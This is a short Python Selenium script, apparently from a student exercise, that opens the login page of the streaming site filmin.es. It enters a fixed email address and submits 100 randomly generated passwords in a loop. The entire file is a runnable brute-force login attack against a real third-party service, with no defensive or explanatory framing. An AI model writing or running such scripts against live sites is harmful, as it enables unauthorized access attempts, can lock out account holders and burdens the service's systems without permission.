from selenium.webdriver.common.keys import Keys
from selenium import webdriver
import time
import string, random

driver = webdriver.Edge(executable_path=r"D:\Universidad\2021\Practica\Chrome_driver\msedgedriver.exe")
driver.get("https://www.filmin.es")
driver.execute_script('document.querySelector("body > div.layout__header > header > div.site-header--on-desktop.align-items-center > a.ml-3.c-button.c-button--sm.c-button--light.c-button--outline").click()')
dicc=string.ascii_lowercase+string.digits
mail=driver.find_element_by_xpath('//*[@id="login-username"]')
mail.send_keys("adam13w_n335e@pebih.com")
time.sleep(1)
for i in range(100):
    passw = ''.join(random.choice(dicc) for j in range(random.randrange(5,50)))
    time.sleep(1)
   
    clave=driver.find_element_by_xpath('//*[@id="login-password"]')
    time.sleep(1)
    clave.send_keys(passw)
    time.sleep(1)
    driver.execute_script('document.querySelector("#signIn > form > button").click()')
    time.sleep(2)
    clave.clear()


driver.close()